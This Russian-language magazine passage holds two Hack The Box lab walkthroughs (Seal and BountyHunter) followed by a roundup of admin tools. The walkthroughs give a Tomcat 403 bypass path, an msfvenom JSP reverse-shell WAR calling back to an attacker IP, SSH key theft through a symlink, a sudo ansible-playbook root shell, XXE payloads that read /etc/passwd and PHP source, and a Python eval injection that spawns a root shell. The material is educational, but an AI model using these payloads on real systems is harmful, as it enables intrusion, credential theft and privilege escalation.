на сайте. Давай просмотрим историю коммитов. Продвигаясь снизу вверх,
остановимся на следующем коммите:


http://seal.htb:8080/root/seal_market/commit/
ac210325afd2f6ae17cce84a8aa42805ce5fd010

В нем мы найдем файл конфигурации Tomcat и необходимый для авториза‐
ции пароль.





                   Пароль в файле конфигурации Tomcat

Пробуем авторизоваться с этим паролем в системе GitBucket от имени всех
обнаруженных  пользователей и  выясняем,  что можем  зайти  как luis.
К сожалению, ничего нового нам это не открывает, а к SSH пароль Льюиса
не подошел. Поэтому перейдем к сайту маркета.


ТОЧКА ВХОДА
На сайте у нас возможностей немного, поэтому поищем скрытые страницы
перебором. Я буду использовать утилиту ffuf и словарь из набора Seclists.

Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю легкий и очень быстрый ffuf. При запуске используем сле‐
дующие параметры:
 • -w — словарь (используем directory-list-2.3-medium);
 • -t — количество потоков;
 • -u — URL;
 • -fc — исключить из результата ответы с кодом 403.

Команда получается следующая:


 ffuf -w ../wordlists/_to_check/directory-list-2.3-medium.txt -u
 https://seal.htb/FUZZ -fc 403 -t 200





                Результат сканирования каталогов с помощью ffuf

Все найденные страницы выполняют редирект в соответствующий каталог.
Но нам интересны только две: admin и manager.





                 Ответ сервера при доступе к каталогу /admin/

При обращении к каталогу /admin/ нам вернут ошибку 404, откуда мы узна‐
ем, что на сервере работает Apache Tomcat 9.0.31. При этом страница /
manager выполнит редирект в каталог /manager/, откуда нас снова перенап‐
равляет на /manager/html. Последняя же вернет код 403 — это означает, что
у нас недостаточно прав для доступа к странице. Чтобы расширить свою
область  знаний о  сайте,  повторим  сканирование  директорий, но уже
в каталоге /manager/.


ffuf -w ../wordlists/_to_check/directory-list-2.3-medium.txt -u
https://seal.htb/manager/FUZZ -fc 403 -t 200




                Результат сканирования каталогов с помощью ffuf

Открываем для себя две новые страницы: text и status. Ответ 401 означает,
что требуется HTTP-авторизация. У нас уже есть имя пользователя и пароль
из конфига Apache Tomcat, поэтому без проблем проходим авторизацию. Нас
встретит панель Server Status Apache Tomcat.





                   Страница Apache Tomcat Server Status

Этот материал ничего нам не дает, поэтому стоит попробовать пробиться
к закрытым для нас функциям.


ТОЧКА ОПОРЫ
Обход 403 Forbidden
Есть много рекомендаций, как обойти ответ 403 (доступ запрещен), среди
которых использование  редких методов  запроса  (вместо обычных GET
и POST), разных заголовков HTTP и специальных путей к целевой странице.
На все эти случаи у меня есть свои словари, собранные из интернета и объ‐
единенные в один. Поэтому я буду использовать Burp Intruder для перебора
разных вариантов.
  В результате я получил ответы, длина которых значительно больше осталь‐
ных. На вкладке Response в Burp включаем опцию Render, чтобы смотреть
страницы, как в браузере.
   Так мы получаем доступ к функции /manager/html при обращении к /
manager/;%2f../;//html.





Tomcat Admin to RCE
Имея административный доступ к Tomcat, мы можем загрузить на сервер
и затем выполнить файл WAR (набор ресурсов и исполняемых файлов Java).
Конечно же, в нашем случае это будет обратный шелл. Его мы можем собрать
с помощью Msfvenom.


msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.58 LPORT= 443 -f
war -o revshell.war




                     Создание реверс‑шелла на JSP

Этот код должен вызвать коннект на указанный адрес (то есть наш локальный
IP). Пишем: rlwrap nc -lvp 443.


Справка: реверс-шелл
Обратный шелл — это подключение, которое активирует атакуемая машина,
а мы принимаем и таким образом подключаемся к ней, чтобы выполнять
команды от лица пользователя, который запустил шелл. Для приема соеди‐
нения необходимо создать на локальной машине  listener, то есть «слу‐
шатель».
  В таких случаях пригодится rlwrap — readline-оболочка, которая в числе
прочего позволяет пользоваться историей команд. Она обычно доступна
в репозитории дистрибутива.
  В качестве самого листенера при этом можно использовать широко
известный netcat.


 rlwrap nc -lvp [port]




Но файл просто так не загрузить, так как мы получаем доступ к странице толь‐
ко через специальный путь. Поэтому указываем файл для загрузки и акти‐
вируем Burp Proxy для отлова запроса.





                        Форма загрузки файла

После появления запроса в Burp Proxy изменим уже знакомый нам путь /
manager/html на /manager/;%2f../;//html.





                        Запрос при загрузке файла



                    Новый запрос при загрузке файла





                             Загруженный файл

После обновления страницы увидим в списке файлов свой реверс‑шелл.
Обращаемся к нему и получаем бэкконнект.




                              Окно листенера


ПРОДВИЖЕНИЕ
Если ты следишь за циклом моих статей, то уже знаешь, что для поиска пути
продвижения я буду использовать LinPEAS.

Справка: скрипты PEASS для Linux
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате.
   Чтобы воспользоваться скриптом, его нужно сначала загрузить на локаль‐
ный хост.


 wget https://github.com/carlospolop/privilege-escalation-awesome-
 scripts-suite/blob/master/linPEAS/linpeas.sh


Теперь надо загрузить его на удаленный хост. В директории со скриптом
на локальной машине запустим с помощью Python простой веб‑сервер. Пос‐
ле выполнения этой команды веб‑сервер будет прослушивать порт 8000.


 python3 -m http.server


А теперь с помощью того же wget на целевой машине загрузим скрипт
с локального хоста на удаленный. После загрузки необходимо дать файлу
право на выполнение и выполнить скрипт.


 wget http://[ip_локального_хоста]:8000/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh




Информации получаем много, но ухватиться, казалось бы, не за что. Единс‐
твенный момент — в дереве процессов видим запущенный скрипт из пла‐
нировщика задач cron. Это может быть интересно!




                           Дерево процессов

Playbook во фреймворке Ansible определяет серию некоторых действий
для выполнения. Часто плейбуки используют для начальной настройки сер‐
веров — добавления пользователей и каталогов, управления пакетами ПО и
файлами. У нас в ansible-playbook передается файл конфигурации /opt/
backups/playbook/run.yml.





                       Содержимое скрипта run.yml

В файле три задачи: Copy Files, Server Backups и Clean. То есть сначала
файлы из директории /var/lib/tomcat9/webapps/ROOT/admin/dashboard
копируются в каталог /opt/backups/files, затем файлы в этой директории
архивируются и удаляются.





                   Содержимое директории dashboard





                    Содержимое директории backups

Так как выполняется копирование и файлов по ссылкам (опция copy_links)
в контексте пользователя luis, то мы можем сделать ссылку на его личные
файлы, что позволит их скопировать, когда cron запустит задачу. Конечно же,
копировать будем приватный ключ SSH. Сделаем ссылку на ключ и поместим
ее в целевую директорию. Спустя время обнаружим появившийся архив.


ln -s /home/luis/.ssh/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/
uploads



                                 Бэкап файлов

Открываем архив и достаем ключ.


cp /opt/backups/archives/backup-2021-07-15-15:10:32.gz /tmp/b.gz
gzip -kd /tmp/b.gz
tar -xf /tmp/b
cat /tmp/dashboard/uploads/.ssh/id_rsa
chmod 0600 id_rsa





                             Приватный ключ SSH




                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Повторный запуск LinPEAS не показывает драматичных различий, но зацепка
все же есть — настройки sudoers.

Справка: sudoers
Файл /etc/sudoers в Linux содержит списки команд, которые разные группы
пользователей могут выполнять от имени администратора системы. Можно
просмотреть его как напрямую, так и при помощи команды sudo -l.





                               Настройка sudoers

Любой пользователь (ALL) может выполнить команду /usr/bin/ansible-
playbook * в привилегированном контексте без ввода пароля (NOPASSWD).
Открываем сайт GTFOBins и находим технику локального повышения при‐
вилегий для этого приложения.





     Техника GTFOBins для повышения привилегий через Ansible Playbook

Эта команда создает файл конфигурации playbook во временной директории.
Файл содержит одну выполняемую задачу — запуск оболочки /bin/sh. В кон‐
це ansible-playbook запускается в привилегированном контексте, что нам
даст привилегированную оболочку.


TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty
2>/dev/tty]}]' >$TF
sudo ansible-playbook $TF





                           Флаг рута

Машина захвачена, мы имеем над ней полный контроль!
ВЗЛОМ

        HTB
BOUNTYHUNTER





    ЛОМАЕМ САЙТ НА PHP ЧЕРЕЗ XXE
     И ПЕНТЕСТИМ ПРИЛОЖЕНИЕ
            НА PYTHON





В этой статье на примере простой по слож‐
ности машины BountyHunter с Hack The Box
я  продемонстрирую  эксплуатацию  уяз‐
вимости XXE, работу с обертками в PHP
и   эксплуатацию   бага   в   программе             RalfHacker                                                                                             hackerralf8@gmail.com
на Python. Это не самые хитрые уязвимос‐
ти, зато они встречаются в реальных усло‐
виях.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА. СКАНИРОВАНИЕ ПОРТОВ
Добавляем IP-адрес машины в /etc/hosts:


10.10.10.100    bountyhunter.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$/ /)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Находим два открытых порта: 22 (служба SSH) и 80 (веб‑сервер Apache
2.4.41). Начинаем с веб‑сервера.

Справка: брутфорс учеток
Поскольку в начале прохождения у нас нет учетных данных, нет и смысла изу‐
чать службы, которые всегда требуют авторизации (например, SSH). Единс‐
твенное, что мы можем делать здесь, — это перебирать пароли брутфорсом,
но у машин с HTB почти всегда есть другое прохождение. В жизни таких вари‐
антов может не быть, к тому же есть шансы подобрать пароль или получить
его при помощи социальной инженерии.


Внимательно изучим сайт и соберем ценную информацию. Сайт кажется
простеньким. Видим несколько навигационных ссылок и кнопку для скачива‐
ния какого‑то файла.





Кнопка оказалась нерабочей, как и первые две ссылки, но зато ссылка Portal
приводит нас на страницу portal.php с текстом «Portal under development.
Go here to test the bounty tracker» и еще одной ссылкой. При переходе по ней
нас встретит форма ввода «Bounty Report System - Beta».


ТОЧКА ВХОДА
Отправив тестовые данные, мы получим сообщение, что если база данных
готова, то наши данные будут в нее добавлены.





                     Форма Bounty Report System

Первым делом я хотел тестировать SQL-инъекцию в запросе Insert, но все же
взглянул на весь путь наших запросов через Burp. Все запросы можно уви‐
деть в Burp History.





                             Вкладка Burp History

Что бросилось в глаза — я заполнял четыре параметра, а отправляется один,
причем в кодировке Base64. Благо в Burp Pro сейчас есть плагин Inspector,
который автоматически разбирает и снимает известные кодировки.





                            Burp Inspector

Именно Inspector заставил меня перейти с тестирования SQL-инъекции
на поиск XXE. А все потому, что параметры отправляются в формате XML.


ТОЧКА ОПОРЫ
XXE-инъекция
XML eXternal Entity (XXE) инъекция — это уязвимость в сервисах, которые под‐
держивают протоколы SOAP и XML-RPC и принимают входные данные в виде
XML-документа. Стандарт XML поддерживает включение секции DTD, а сек‐
ции эти, в свою очередь, могут подключать к документу дополнительные ком‐
поненты, так называемые внешние сущности.
   Внешние  сущности —  это  отдельные  файлы,  и  добавляются  они
с помощью ключевого слова SYSTEM и URI. Если XML-парсер невалидиру‐
ющий, то он может просто загрузить внешнюю сущность и подключить
к содержимому XML-документа. У злоумышленника есть возможность подста‐
вить в URI внешней сущности file URI, указывающий на удаленный или локаль‐
ный файл в системе.
  А теперь давай перейдем к нашему примеру. Ниже представлен документ
XML, который отправляется на сервер.


<?xml  version="1.0" encoding="ISO-8859-1"?>
<bugreport>
    <title>test</title>
    <cwe> test</cwe>
    <cvss> test</cvss>
    <reward>test</reward>
</bugreport>

Чтобы  поискать  уязвимость,  подключим  сначала внутреннюю  сущность.
Для этого определим секцию DOCTYPE и сущность (ENTITY) testXXE со зна‐
чением RALF. В самом документе можем обращаться к нашей сущности
testXXX как будто через ссылку &testXXE;. Причем вставим последователь‐
ность для теста абсолютно во все параметры, чтобы увеличить шансы.


<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY testXXE "RALF"> ]>
<bugreport>
    <title>&testXXE;</title>
    <cwe>&testXXE;</cwe>
    <cvss>&testXXE;</cvss>
    <reward>&testXXE;</reward>
</bugreport>





                          Запрос, тестирующий XXE

В итоге вместо &testXXE; подставляется значение RALF, что свидетельствует
о наличии XXE. Давай попробуем ее развить: к примеру, прочитать локальный
файл в системе. Будем читать доступный всегда и для всех пользователей
файл /etc/passwd. Для этого определим сущность, но уже не как локальную
строку, а как внешний файл в системе:


[<!ENTITY testXXE SYSTEM "file:///etc/passwd"> ]

Документ получился следующий:


<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY testXXE SYSTEM "file:///etc/passwd"> ]>
<bugreport>
    <title>&testXXE;</title>
    <cwe> test</cwe>
    <cvss> test</cvss>
    <reward>test</reward>
</bugreport>





                     Содержимое файла /etc/passwd

Система вернула нам содержимое желаемого файла. В основном все поль‐
зователи стандартные и относятся к системе, а вот логин development — нет.
Интересно!
   Следующий шаг — поиск учетных данных. Раз мы можем читать про‐
извольные файлы, проверим исходники сайта. Начнем с известной нам стра‐
ницы tracker_diRbPr00f314.php. Но просто передать файл в сущность
теперь не выйдет, так как при запросе содержимого кода на PHP веб‑сервер
не отобразит, а выполнит его. Чтобы этого не случалось, будем использовать
обертку PHP.


PHP wrappers
PHP поставляется со множеством встроенных оберток для обращения к фун‐
кциям  файловой  системы, таким  как fopen(), copy(), file_exists()
и filesize(). В случаях, подобных нашему, чаще всего используется обер‐
тка, реализующая схему php://, которая предоставляет доступ к потокам
ввода‑вывода.
  В частности, как файлы в PHP можно открыть:
 • собственные потоки ввода‑вывода PHP;
 • дескрипторы стандартного ввода, вывода и потока ошибок;
 • временные файловые потоки в памяти и на диске;
 • фильтры, которые могут манипулировать другими файловыми ресурсами
   по мере их считывания или записи.

Давай разберемся с фильтрами. По адресу php://filter доступна мета‐
обертка, которая позволяет применять фильтры к потоку во время открытия.
Это полезно для функций вроде readfile(), file() и file_get_contents(
), где нет возможности применить фильтр к потоку до того, как содержимое
будет прочитано. А это наш случай.
   Поток php://filter принимает как часть пути следующие параметры:
 • resource — указывает потоку, что его необходимо отфильтровать;
 • read — одно имя или несколько имен фильтров для чтения, разделенных
   символом |;
 • write — одно имя или несколько имен фильтров для записи, разделенных
   символом |;
 • [список фильтров для применения к обеим цепочкам] — список
   фильтров, который будет применен к обоим потокам на чтение и на
   запись.

Переходим к практике. Мы можем собрать фильтр‑обертку, который будет
кодировать поток ввода еще при чтении кода из файла.


php://filter/read=convert.base64-encode/resource=tracker_
diRbPr00f314.php

Это приведет к тому, что на сайте будет отображен код требуемой страницы,
но сразу закодированный в Base64. Применим обертку в нашей XXE-наг‐
рузке:


<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY testXXE SYSTEM "php://filter/
read=convert.base64-encode/resource=tracker_diRbPr00f314.php"> ]>
<bugreport>
    <title>&testXXE;</title>
    <cwe> test</cwe>
    <cvss> test</cvss>
    <reward>test</reward>
</bugreport>





                      Отправка запросов с PHP-фильтром

Теперь в Burp выделяем текст, закодированный в Base64, и нажимаем Ctrl-
Shift-B. Откроется новое окно Burp с декодированным текстом.





                Декодированный код tracker_diRbPr00f314.php

Ничего интересного в этом файле не находим, как и в коде остальных извес‐
тных нам страниц сайта. В таком случае просканируем файлы PHP в корневом
каталоге сайта, к примеру с помощью ffuf.

Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю легкий и очень быстрый ffuf. При запуске указываем сле‐
дующие параметры:
 • -w — словарь (используем directory-list-2.3-medium из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -fc — исключить из результата ответы с кодом 403.



Список популярных файлов PHP можно найти в наборе словарей SecLists.


ffuf  -u http://bountyhunter.htb/FUZZ -w php_files_common.txt -t 200
-fc 403




                          Результат сканирования файлов

Там мы находим новый файл — db.php. Это файл, который обеспечивает
подключение к базе данных и должен содержать необходимые параметры,
в том числе учетные данные для доступа к БД.





                       Содержимое файла db.php

Найденный пароль подходит для обнаруженного в файле /etc/passwd юзера
development, и мы получаем флаг пользователя.




                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Для повышения привилегий в Linux всегда стоит проверять настройки sudoers
и приложения с выставленным битом SUID.

Справка: sudoers
Файл /etc/sudoers в Linux содержит списки команд, которые разные группы
пользователей могут выполнять от имени администратора системы. Можно
просмотреть его как напрямую, так и при помощи команды sudo -l.



При проверке sudoers (sudo -l) сразу находим зацепку.




                              Настройки судоера

Таким образом, мы можем без  ввода пароля выполнить скрипт /opt/
skytrain_inc/ticketValidator.py в привилегированном контексте. Пос‐
мотрим, что в нем!





                   Содержимое файла ticketValidator.py

Начнем  анализ с  функции main. Первым делом  у нас  запросят  путь
к какому‑то файлу и передадут то, что мы ввели, в функцию load_file. В ней
проверяется расширение файла. Если это файл в формате Markdown (.md),
то он открывается, а программа продолжает работать.
   Затем дескриптор открытого файла передается в функцию evaluate. Она
построчно считывает и проверяет файл. Так, первой строкой должно быть
выражение # Skytrain Inc, вторая строка должна начинаться с последова‐
тельности ## Ticket to, а третья — __Ticket Code:__. Все остальные
строки должны начинаться символами **.
   Если все проверки пройдены, то, начиная с четвертой строки, в перемен‐
ную ticketCode будет считываться число между символами ** и +. При этом
остаток от деления этого числа на 7 должен быть равен 4. В этом случае вся
строка без символов ** передается в функцию eval.
  Мы добрались до вызова опасной функции, которая должна выполнять код
Python, — тут и кроется уязвимость. Так как Python — это не сценарный язык
вроде bash, информацию об ошибках мы получим только во время выпол‐
нения кода.
  К примеру, если я передам в функцию eval строку 4+sdffds, то прог‐
рамма сразу сигнализирует об ошибке. Но если в ту же функцию eval
передать строку (4+print('qwe')), то ошибка будет вызвана не сразу, так
как Python сначала выполнит функцию print, а потом eval.




                           Тестовый запуск кода

Таким образом, мы можем поместить в итоговый файл код на Python после
знака +, и этот код будет выполнен. Можем переходить к выбору нагрузки.
   Абсолютно все способы получения управления требуют подключить дру‐
гие модули. Так как мы не можем использовать последовательность команд
через точку с запятой, остается выполнять однострочники по следующему
шаблону:


__import__('module').method('param')

где module — импортируемый модуль, method — функция из этого модуля,
а param — параметры функции.




                      Тестовый вызов функции Base64

Подключать будем модуль pty, из которого используем функцию spawn
для создания командной оболочки в привилегированном контексте. Объеди‐
нив всё, получим следующий файл Markdown:


# Skytrain Inc
## Ticket to ralf
__Ticket Code:__
**4+(__import__('pty').spawn('/bin/bash'))





                           Флаг рута

Машина захвачена, и мы получаем флаг рута.
ТРЮКИ
МАСТЕРСКАЯМАСТЕРСКАЯ
     ХАКЕРАХАКЕРА





  ПОДБОРКА ПОЛЕЗНЫХ
    ИНСТРУМЕНТОВ
  ДЛЯ WINDOWS И LINUX                           Hackcat
                                                                                        hackcat.dev@gmail.com





Век живи — век собирай  всякие полезные  штуковины!
Руководствуясь этим правилом, я скопил обширную кол‐
лекцию утилит, лучшими из которых хочу с тобой поделиться.
Может, и ты подберешь себе что‑то, что поможет тебе
в ежедневной работе или выручит в сложную минуту.


             INFO

                      Это уже третья подборка утилит, которую я пуб‐
                      ликую в «Хакере». В первой были собраны полез‐
                        нейшие консольные тулзы, во второй — средства
                          автоматизации.
                          Часть утилит из этой статьи прислал мне бла‐
                         годарный подписчик. Если у тебя тоже есть о чем
                             рассказать миру — добро пожаловать в коммента‐
                        рии.



WINDOWS & WSL
WSL Host Patcher
Как известно, в Windows 10 и 11 можно запускать приложения для Linux. Сис‐
тема, которая позволяет это делать, называется WSL — Windows Subsystem
for Linux. WSL (в простонародье — «весло») имеет две версии, незамыс‐
ловато названные WSL и WSL 2. Первая версия вышла в 2016 году и уже
морально устарела. Масштабно обновили систему в 2020 году, в релизе
Windows 10 2004 — чтобы не путать, ее тогда и назвали WSL 2. Внутри WSL
2 — виртуальная машина Hyper-V с проброшенными в нее ресурсами хоста.
   Когда какой‑то  процесс  внутри WSL 2  начинает  слушать TCP-порт,
wslhost.exe слушает этот же порт на 127.0.0.1 хоста, фактически проксируя
его наружу, на хост. Проблема такого форвардинга в том, что снаружи хоста
этот порт недоступен, то есть поднятый на 8080-м порте веб‑сервис в WSL
доступен для хоста, но не торчит в локалку.
   Если хочется получить доступ к такому сервису снаружи, а не только
с машины с самой WSL — пригодится WSL Host Patcher. Все, что он делает, —
это  патчит  в  памяти  wslhost.exe,  чтобы  тот  открывал  соединения
не на 127.0.0.1, а на 0.0.0.0, слушая соответствующий порт на всех интерфей‐
сах.


Wslgit
В продолжение извращений с WSL хочу показать маленькую утилиту на Rust,
которая просто транслирует все вызовы себя в соответствующие вызовы git
в WSL 2. Зачем это надо? Допустим, у тебя есть какой‑то очень большой
репозиторий Git внутри WSL, а ты работаешь в текстовом редакторе с хоста.
Чтобы Git корректно работал с кодом внутри полувиртуального Linux, нужно
как‑то транслировать вызовы Git с исправленными путями внутрь контейнера.
Wslgit делает ровно это: исправляет путь, чтобы получить доступ из контей‐
нера к файлам хоста, и запускает Git в WSL 2, чтобы выполнить нужное дей‐
ствие. Просто и понятно.
   Юзкейсов wslgit немного, но иногда он совершенно незаменим.


Очистка памяти vmmem
Раз уж заговорили о WSL, упомянем еще одну важную проблему, из‑за
которой порой приходится перезагружать совершенно исправный компьютер
с неделями аптайма. WSL очень любит агрессивно кешировать в оператив‐
ную память, но не спешит освобождать ее, когда эта память нужна винде.
В  результате  процесс vmmem  съедает всю  оперативку, и  приходится
перезагружаться.
   Решение проблемы простое — выполнить от рута следующую команду
в WSL:


# sh -c "echo 3 > /proc/sys/vm/drop_caches"

Но должен быть и способ получше. Может, ты знаешь? Расскажи в комментах!


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИТРЮКИ
  МАСТЕРСКАЯ ХАКЕРА
             ПОДБОРКА ПОЛЕЗНЫХ ИНСТРУМЕНТОВ
                         ДЛЯ WINDOWS И LINUX





WEB
TLS Support Check
TLS.support — это быстрый способ проверить, поддерживает ли браузер сов‐
ременные фичи TLS. Сервис проверяет поддержку одноразовых ключей, спи‐
сок доступных шифров, мгновенное возобновление шифрованного соеди‐
нения и некоторые другие вещи.





                                TLS.support

На сервисе можно получить код результата конкретной проверки. Удобно,
если ты хочешь попросить кого‑то протестировать работу и показать резуль‐
таты.


SSH web client
Как‑то раз мне нужен был веб‑терминал. Я поискал и нашел проект Webshell.
   Webshell — это полноценный терминал прямо в окне браузера. Он работа‐
ет как SSH-клиент, но для моих задач было достаточно просто подключиться
через него к 127.0.0.1 и работать. Сочетания клавиш поддерживаются, пол‐
ноэкранные программы вроде htop и nano — тоже. Что нам еще нужно
для счастья?
   Если у тебя есть свой сервер и ты хочешь иметь возможность получать
к нему доступ из SSH через браузер, то это отличный вариант.
   Устанавливается программа через Docker:


docker run -d --security-opt seccomp=unconfined -p 8018:80 -e
ALLOWED_NETWORKS=0.0.0.0/0 bwsw/webshell





                           Webshell в действии


Ots
Нужно из терминала поделиться какой‑то временной заметкой? Держи тогда
аналог Privnote (сервис шеринга одноразовых заметок, которые уничтожа‐
ются после прочтения), но работающий из терминала!
   Ots —  это  консольная  утилита  с  end-to-end-шифрованием и  воз‐
можностью более‑менее безопасно шерить секреты.
  Для  установки  достаточно  использовать brew  (brew  install  ots),
но если ты приверженец традиционных для Linux способов установки, то brew
не наш метод. Идем в консоль и пишем:


$ curl -L https://github.com/sniptt-official/ots/releases/download/
v0.1.0/ots_0.1.0_darwin_amd64.tar.gz -o ots.tar.gz
$ sudo mkdir -p /usr/local/ots-cli
$ sudo tar -C /usr/local/ots-cli -xvf ots.tar.gz
$ sudo ln -sf /usr/local/ots-cli/ots /usr/local/bin/ots
$ rm ots.tar.gz

Кроме этого билда, есть еще сборки под ARM64 и даже под Windows — то
есть поставить получится вообще на что угодно.
   Создать заметку легче некуда: просто напиши ots new!





                           Начало использования

Кстати, введенные данные не отображаются, как если бы это был пароль, что
способствует приватности.
   Аргумент -x позволяет задать срок годности заметки: даже если ее никто
не откроет, по истечении заданного времени она самоуничтожится.
  Для  шеринга  секретных  конфигов  можно  использовать  стандартные
для юниксовых систем пайпы:


$ cat secret-keys.json | ots new

У сервиса есть веб‑версия — ots.sniptt.com, которая эмулирует ots  new
в окне браузера.





                         Пересылаем в браузере





                         Как выглядят секреты

Если попробовать открыть страницу с заметкой во второй раз — получим
отказ, ведь заметки уже нет!





Focalboard
Раньше я пользовался Trello, но потом стал искать бесплатную альтернативу
и нашел — она называется Focalboard. Это классный self-hosted-сервис, раз‐
работанный авторами Mattermost (замена Slack для компаний). Можно пос‐
тавить на свой комп или на какой‑то собственный сервер, если нужна великая
секретность.





                   Пример использования Focalboard

Установить Focalboard можно на Windows, Linux и даже Mac. И если для винды
и макоси приложение просто скачиваешь в официальном магазине, то с вер‐
сией для Linux нас ждет традиционно чуть более длинный путь: придется вруч‐
ную   скачать  последний  релиз   проекта  себе  и  распаковать  его
(tar -xzvf focalboard-linux.tar.gz). Затем запустить focalboard-app/
focalboard-app. Длиннее, но не намного сложнее.
  Для желающих развернуть Focalboard на собственном сервере есть воз‐
можность сделать это буквально в одну команду:


docker run -it -p 8091:8000 mattermost/focalboard

После установки перейди по адресу твой-ip:8091, и увидишь формочку вхо‐
да (на скриншоте ниже). Тут надо создать аккаунт (кнопочка create account
внизу), и ты попадешь в такой же интерфейс Focalboard, но через браузер.
И да, никакие введенные при регистрации данные подтверждать не требует‐
ся.





FPS Check
Бывает, нужно узнать, сколько кадров в секунду (FPS) может отобразить
экран. Все больше производителей заявляют частоту обновления экрана
как преимущество своих продуктов, так что становится интересно их про‐
верить.
  С помощью  сайта  TestUfo ты сможешь  выяснить,  действительно ли
монитор обеспечивает заявленную скорость обновления  картинки. Тест
начинается сразу после загрузки страницы.





Посередине  страницы  отображаются  дорожки,  двигающиеся с  разным
количеством кадров в секунду. На верхней дорожке частота кадров мак‐
симальная, на нижней — минимальная.
   Кроме НЛО‑теста на FPS, сайт предлагает еще около трех десятков тестов
на все случаи жизни: тут и проверка на ШИМ, и замер таймингов при отоб‐
ражении графики  браузером, и даже симуляция  видеоигры. Мне было
как минимум интересно потыкать.


Canvas Defender
Отпечатки  браузера широко  используются  сайтами  для  отслеживания
посетителей и их поведения. Браузеру присваивается уникальный иден‐
тификатор, к которому привязывается много информации о настройках и воз‐
можностях браузера.
  Один из методов создания такого идентификатора — использование
HTML-тега <canvas>. Расширение Canvas Fingerprint Defender скрывает нас‐
тоящий отпечаток, получаемый таким методом. Оно не блокирует такой тре‐
кинг, а добавляет в отпечаток случайный шум. Из‑за этого отпечаток ста‐
новится бесполезным для отслеживания. Важно только понимать, что от всех
остальных способов трекинга это не защищает, так что отправлять другие
защитные решения на пенсию пока рановато.
   Отпечаток  обновляется при  каждой  перезагрузке  страницы.  Плагин
не требует настройки и начинает работу сразу после установки. Доступен
для Chrome, Firefox, Microsoft Edge и Opera.
  Для   проверки  работы   расширения   я   воспользовался   тестом
на WebBrowserTools.com. При каждой перезагрузке страницы отпечатки дей‐
ствительно разные.





                      Отпечатки сгенерированы случайные

При каждой попытке трекинга расширение выдает соответствующее уведом‐
ление.





Uptime Kuma
Недавно мне нужно было организовать простой мониторинг нескольких сай‐
тов на разных поддоменах. Потом аппетиты выросли и появилось желание
добавить до кучи еще парочку сетевых демонов. Zabbix для таких случаев,
думаю, тяжеловат, а вот легковесный контейнер, практически не требующий
настройки, — то, что надо!
   Тогда я поискал и нашел альтернативу, причем намного более приятную
глазу. Знакомься: Uptime Kuma — простой self-hosted-инструмент для соз‐
дания  страниц,  позволяющих  отслеживать  работоспособность  сервисов
и мониторинга, когда не нужно детально анализировать системные парамет‐
ры на наблюдаемых машинах.





                    Темная тема тоже поддерживается!

Установить можно несколькими способами. Первый и самый простой —
с помощью интерактивного установщика:


curl -o kuma_install.sh http://git.kuma.pet/install.sh && sudo bash
kuma_install.sh

Второй, который использовал я, требует Docker:


docker volume create uptime-kuma
docker run -d --restart=always -p 3001:3001 -v uptime-kuma:/app/data
--name uptime-kuma louislam/uptime-kuma:1

Для тех, у кого есть уже установленный Node.js и желание сделать все вруч‐
ную, есть и третий способ:


npm install npm -g
git clone https://github.com/louislam/uptime-kuma.git
cd uptime-kuma
npm run setup


# Простой запуск, для проверки
node server/server.js


# Запуск «на постоянку»
# Если нет PM2, установи его с помощью "npm install pm2 -g"
pm2 start server/server.js --name uptime-kuma

Во всех этих случаях есть одна маленькая проблема: если ты используешь
реверс‑прокси вроде nginx, как я, — работать Uptime Kuma не будет, потому
что требует полноценных веб‑сокетов. Пофиксить это для nginx можно так:


server {
         listen 443 ssl http2 ;
         server_name YOUR_DOMAIN_HERE ;
         ssl_certificate /etc/nginx /certs /upmonitor .crt;
         ssl_certificate_key /etc/nginx /certs /upmonitor .key;
         location / {
                 proxy_set_header   X -Real -IP $remote_addr;
                 proxy_set_header   X -Forwarded -For $
proxy_add_x_forwarded_for;
                 proxy_pass http ://127.0 .0 .1 :3001 /;
                 proxy_http_version 1 .1 ;
                 proxy_set_header   Upgrade $http_upgrade ;
                 proxy_set_header   Connection "upgrade" ;
         }
 }

Ну и для тех, чей сервер — это старый Android-смартфон, — способ номер
четыре. Нужно скачать актуальный Termux, причем не из Play Маркета, где он
